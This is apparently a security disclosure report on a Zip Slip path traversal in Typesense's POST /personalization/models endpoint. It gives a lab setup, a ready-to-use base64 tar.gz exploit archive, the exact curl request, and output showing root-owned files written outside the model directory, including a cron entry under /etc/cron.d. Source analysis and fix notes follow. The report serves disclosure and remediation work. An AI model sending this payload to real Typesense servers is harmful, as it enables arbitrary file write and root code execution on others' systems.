### Vulnerability details

**Official website / Product:** https://typesense.org / https://github.com/typesense/typesense

**Repository:** typesense/typesense (stars at selection: 27000)

**Vulnerability type:** file_upload (Zip Slip / tar.gz path traversal → arbitrary file write / getshell chain)

**Vulnerability versions:** Official Docker `typesense/typesense:30.2`; sink also present on default-branch tip `9ff8fb05af974a1c51f48c5d95ed5e4887626623` (`src/archive_utils.cpp`). Affects deployments that expose `POST /personalization/models` to an API key allowed to create personalization models (typically the bootstrap admin key).

**Vulnerability URL / Parameter:** `POST /personalization/models` — query params `name`/`type`/`id`; request body = `.tar.gz` archive. Malicious entry names such as `../../../../tmp/r38a9-pwned.txt`, `../../../../tmp/r38a9-getshell-marker`, and `../../../../etc/cron.d/r38a9pwn` (escape relative to extract destination `/data/models/per_<id>/`).

**Complex:** yes

### Verification procedure

1. **Rebuild the lab** (original `labs/typesense-r38-a9/` was cleaned after the audit; rebuild from the compose below). Create a directory such as `labs/typesense-r38-a9/` with `docker-compose.yml`:

```yaml
services:
  typesense:
    image: typesense/typesense:30.2
    container_name: typesense-r38-a9
    ports:
      - "21809:8108"
    command:
      - "--data-dir"
      - "/data"
      - "--api-key"
      - "r38a9apikey"
      - "--enable-cors"
    volumes:
      - tsdata:/data
volumes:
  tsdata:
```

2. `docker compose up -d`; confirm `0.0.0.0:21809->8108/tcp`, container name `typesense-r38-a9`. Expected `docker compose ps` looks like:

```
NAME               IMAGE                      COMMAND                  SERVICE     STATUS         PORTS
typesense-r38-a9   typesense/typesense:30.2   "/opt/typesense-serv…"   typesense   Up             0.0.0.0:21809->8108/tcp, [::]:21809->8108/tcp
```

Process looks like: `/opt/typesense-server --data-dir /data --api-key r38a9apikey --enable-cors` (runs as root). Health check: `curl -s -H 'X-TYPESENSE-API-KEY: r38a9apikey' http://127.0.0.1:21809/` → includes `"version":"30.2"`.

3. Build PoC archive `evil-gs.tar.gz` (395 bytes; Zip Slip entries first). Entry list:

```
../../../../tmp/r38a9-pwned.txt
../../../../tmp/r38a9-getshell-marker
../../../../etc/cron.d/r38a9pwn
recommendation_model.onnx
user_model.onnx
item_model.onnx
vocab.txt
prompts.json
```

Losslessly restore from the complete Base64 below (sha256 `b23bbd108b5ad2e600f5269ed32e32c3726ee8e3c3731b7b2f4cc58c16b81738`):

```bash
base64 -d > evil-gs.tar.gz <<'EOF'
H4sICH8G6GoC/2V2aWwtZ3MudGFyAO2YzU6EMBRGWfsUhKWxpVAG/ElMTHwA98YYhlYHpS3TFh00vrsMZuKEMXEhoA73tEmbbrq4PfdLirGPN9OK0tf0OD1B5bPkDNuVdfqANMRR1K4N3ZWQKPzcr8+DkNLEcYkzApWxqW6ud6ZJW2k0r1FTeNRU/iUvTZGXyNYlN1wafuAAewz+0v97bs2CFwUSqX7kemj/w7jjP42SCPwfg06lUVt/cH6S/nOb+ZlWErOPNtBkwyj5H5Cd/A/jGPwfg0N3M7RS1s2Ze+5uBUHbG85cq6pssX2+fiboLtecQa/412ieKSG4ZKnNlbwVivECKylXPd7xbf6TnfwnNAD/x4BVQtTg8GSpDNfDWP8T/wNCKPgP/gNDk1su/p7/JInBf/AfGJwnlaXz3n76e/KfJDP4/xuH66uLyxvwf7KUWonSGvxglPw1/ynp5j+lM/B/DF69pXfqLSuua+/IY82eqcx7g44AAAAAAACwp7wDJTTCqgAoAAA=
EOF
wc -c evil-gs.tar.gz   # expect 395
sha256sum evil-gs.tar.gz
# expect b23bbd108b5ad2e600f5269ed32e32c3726ee8e3c3731b7b2f4cc58c16b81738
```

4. Send the full HTTP below, or equivalent curl (body = raw gzip bytes; do not change Content-Type):

```bash
curl -sS -D- \
  -H 'X-TYPESENSE-API-KEY: r38a9apikey' \
  -H 'Content-Type: application/gzip' \
  --data-binary @evil-gs.tar.gz \
  'http://127.0.0.1:21809/personalization/models?name=ts/tyrec-1&type=recommendation&id=verify1'
```

5. Expect HTTP **400** with body `{"message":"Missing the required model files in archive"}` (Zip Slip writes happen during extract **before** required-file checks; failed validation does not roll back writes).
6. Confirm arbitrary write / getshell primitive inside the container:

```bash
docker exec typesense-r38-a9 ls -la /tmp/r38a9-pwned.txt /tmp/r38a9-getshell-marker /etc/cron.d/r38a9pwn
docker exec typesense-r38-a9 cat /tmp/r38a9-pwned.txt
docker exec typesense-r38-a9 cat /tmp/r38a9-getshell-marker
docker exec typesense-r38-a9 cat /etc/cron.d/r38a9pwn
```

Expected output:

```
== AFW proof ==
-rw-r--r-- 1 root root 66 Jan  1  1970 /etc/cron.d/r38a9pwn
-rw-r--r-- 1 root root 22 Jan  1  1970 /tmp/r38a9-getshell-marker
-rw-r--r-- 1 root root 34 Jan  1  1970 /tmp/r38a9-pwned.txt

pwned-by-r38-a9-zipslip-typesense

getshell-marker-r38a9

* * * * * root id > /tmp/r38a9-shell; touch /tmp/r38a9-cron-fired
```

### Complete vulnerability PoC

Complete HTTP request (Docker-verified). Body is binary gzip; shown as **complete Base64** of the exact 395-byte on-wire body (sha256 `b23bbd108b5ad2e600f5269ed32e32c3726ee8e3c3731b7b2f4cc58c16b81738`). Lossless; reconstruct `evil-gs.tar.gz` as in step 3.

```http
POST /personalization/models?name=ts/tyrec-1&type=recommendation&id=verify1 HTTP/1.1
Host: 127.0.0.1:21809
User-Agent: curl/8.22.0
Accept: */*
X-TYPESENSE-API-KEY: r38a9apikey
Content-Type: application/gzip
Content-Length: 395
Connection: close

H4sICH8G6GoC/2V2aWwtZ3MudGFyAO2YzU6EMBRGWfsUhKWxpVAG/ElMTHwA98YYhlYHpS3TFh00vrsMZuKEMXEhoA73tEmbbrq4PfdLirGPN9OK0tf0OD1B5bPkDNuVdfqANMRR1K4N3ZWQKPzcr8+DkNLEcYkzApWxqW6ud6ZJW2k0r1FTeNRU/iUvTZGXyNYlN1wafuAAewz+0v97bs2CFwUSqX7kemj/w7jjP42SCPwfg06lUVt/cH6S/nOb+ZlWErOPNtBkwyj5H5Cd/A/jGPwfg0N3M7RS1s2Ze+5uBUHbG85cq6pssX2+fiboLtecQa/412ieKSG4ZKnNlbwVivECKylXPd7xbf6TnfwnNAD/x4BVQtTg8GSpDNfDWP8T/wNCKPgP/gNDk1su/p7/JInBf/AfGJwnlaXz3n76e/KfJDP4/xuH66uLyxvwf7KUWonSGvxglPw1/ynp5j+lM/B/DF69pXfqLSuua+/IY82eqcx7g44AAAAAAACwp7wDJTTCqgAoAAA=
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 400 Bad Request
Connection: keep-alive
access-control-allow-origin: *
content-type: application/json; charset=utf-8
transfer-encoding: chunked

{"message":"Missing the required model files in archive"}
```

Verification result notes:

```
== AFW proof ==
-rw-r--r-- 1 root root 66 Jan  1  1970 /etc/cron.d/r38a9pwn
-rw-r--r-- 1 root root 22 Jan  1  1970 /tmp/r38a9-getshell-marker
-rw-r--r-- 1 root root 34 Jan  1  1970 /tmp/r38a9-pwned.txt

pwned-by-r38-a9-zipslip-typesense

getshell-marker-r38a9

* * * * * root id > /tmp/r38a9-shell; touch /tmp/r38a9-cron-fired
```

- HTTP 400 `Missing the required model files in archive` is expected: Zip Slip writes happen during extract **before** required-file checks; failed validation does not roll back writes.
- Files created as **root** inside the container outside `/data/models/per_verify1/`, including `/etc/cron.d/` as a getshell primitive (the official 30.2 image may not ship a cron daemon; the write itself proves AFW).
- Demonstrates arbitrary filesystem write outside the model subdirectory.

### Vulnerability analysis

Route: `typesense_server.cpp` registers `POST /personalization/models` → `post_personalization_model` (`core_api.cpp`) takes the raw `req->body`, then `PersonalizationModelManager::add_model` → `PersonalizationModel::create_model`. `get_model_subdir(model_id)` yields the extract destination (typically `/data/models/per_<id>/`), which is passed to `ArchiveUtils::extract_tar_gz_from_memory`.

`extract_tar_gz_from_memory` writes the body to a temp file under the data dir, then calls `extract_tar_gz_from_file`. Extraction uses libarchive `archive_write_disk` with only `ARCHIVE_EXTRACT_TIME|PERM|ACL|FFLAGS` — missing `SECURE_NODOTDOT`, `SECURE_NOABSOLUTEPATHS`, and `SECURE_SYMLINKS`. Entry pathnames are joined as `destination_path + "/" + current_file` with no canonicalization or prefix check. Crafted `../../../../etc/cron.d/...` escapes the models directory. This is unexpected versus the documented model-package install into the model subdirectory; it is not an intentional admin shell API.

After a successful extract return, `create_model` checks for `recommendation_model.onnx` / `user_model.onnx` / `item_model.onnx`; missing files yield HTTP 400 and **do not delete** files already written via Zip Slip.

Trigger / sink source (full path and line numbers):

```cpp
# File: repos/typesense/src/archive_utils.cpp
# Lines: 8-87 (sink in extract_tar_gz_from_file; from_memory stages a temp file then calls it)
bool ArchiveUtils::extract_tar_gz_from_file(const std::string& archive_path, const std::string& destination_path) {
    struct archive* a = nullptr;
    struct archive* ext = nullptr;
    struct archive_entry* entry;
    int flags = ARCHIVE_EXTRACT_TIME | ARCHIVE_EXTRACT_PERM | ARCHIVE_EXTRACT_ACL | ARCHIVE_EXTRACT_FFLAGS;
    bool extraction_successful = true;
    // ... archive_read_new / archive_write_disk_new ...
    archive_write_disk_set_options(ext, flags);
    // ...
    while (extraction_successful) {
        int r = archive_read_next_header(a, &entry);
        if (r == ARCHIVE_EOF) {
            break;
        }
        // ...
        const char* current_file = archive_entry_pathname(entry);
        std::string full_path = destination_path + "/" + current_file;
        archive_entry_set_pathname(entry, full_path.c_str());
        r = archive_write_header(ext, entry);
        // ... copy_data / archive_write_finish_entry ...
    }
    // ...
    return extraction_successful;
}

bool ArchiveUtils::extract_tar_gz_from_memory(const std::string& archive_content, const std::string& destination_path) {
    if (archive_content.empty()) {
        return false;
    }
    std::string temp_file_path = create_temp_tar_gz(archive_content);
    bool result = extract_tar_gz_from_file(temp_file_path, destination_path);
    cleanup(temp_file_path);
    return result;
}
```

```cpp
# File: repos/typesense/src/personalization_model.cpp
# Lines: 8-21, 109-122
std::string PersonalizationModel::get_model_subdir(const std::string& model_id) {
    std::string model_dir = EmbedderManager::get_model_dir();
    if (model_dir.back() != '/') {
        model_dir += '/';
    }
    std::string full_path = model_dir + "per_" + model_id;
    if (!std::filesystem::exists(full_path)) {
        std::filesystem::create_directories(full_path);
    }
    return full_path;
}

Option<nlohmann::json> PersonalizationModel::create_model(const std::string& model_id, const nlohmann::json& model_json, const std::string model_data) {
    std::string model_path = get_model_subdir(model_id);
    std::string metadata_path = model_path + "/metadata.json";

    if (!ArchiveUtils::extract_tar_gz_from_memory(model_data, model_path)) {
        return Option<nlohmann::json>(500, "Failed to extract model archive");
    }

    std::string onnx_path = model_path + "/recommendation_model.onnx";
    std::string user_onnx_path = model_path + "/user_model.onnx";
    std::string item_onnx_path = model_path + "/item_model.onnx";
    if (!std::filesystem::exists(onnx_path) || !std::filesystem::exists(user_onnx_path) || !std::filesystem::exists(item_onnx_path)) {
        return Option<nlohmann::json>(400, "Missing the required model files in archive");
    }
```

```cpp
# File: repos/typesense/src/core_api.cpp
# Lines: 3386-3409
bool post_personalization_model(const std::shared_ptr<http_req>& req, const std::shared_ptr<http_res>& res) {
    // requires query: name, type; optional id
    // ...
    const std::string model_data = req->body;
    auto create_op = PersonalizationModelManager::add_model(req_json, model_id, true, model_data);
    if(!create_op.ok()) {
        res->set(create_op.code(), create_op.error());
        return false;
    }
    // ...
}
```

### Fix notes

1. Enable `ARCHIVE_EXTRACT_SECURE_NODOTDOT | ARCHIVE_EXTRACT_SECURE_NOABSOLUTEPATHS | ARCHIVE_EXTRACT_SECURE_SYMLINKS`.
2. Resolve each entry path and require it stays under `destination_path`; reject otherwise.
3. Extract to a temp directory, validate, then atomically move; delete temp on failure.
4. Reject entry names containing `..` or absolute paths before writing.
